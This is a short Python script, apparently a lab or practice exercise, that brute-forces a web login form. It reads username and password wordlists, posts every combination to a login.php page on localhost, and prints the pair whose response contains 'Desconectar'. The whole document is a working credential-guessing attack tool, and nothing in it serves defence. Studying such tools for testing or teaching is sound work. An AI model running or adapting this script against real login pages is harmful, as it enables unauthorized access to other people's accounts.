import requests

with open("wordlists/senhas.txt", "r") as senhas_file, open("wordlists/usuarios.txt", "r") as usuarios_file:
    senhas = senhas_file.read().splitlines()
    usuarios = usuarios_file.read().splitlines()

url = "http://127.0.0.1/login.php"

sucesso = False
with requests.Session() as sessao:
    for i, usuario in enumerate(usuarios, start=1):

        for j, senha in enumerate(senhas, start=1):
            data = {"user": usuario, "password": senha}

            response = sessao.post(url=url, data=data)
            if "Desconectar" in response.text:
                print(f"Tentativa {i + j}: User:{usuario} e Password:{senha}, usuário e senha corretos\n")
                sucesso = True
                break

        if sucesso:
            break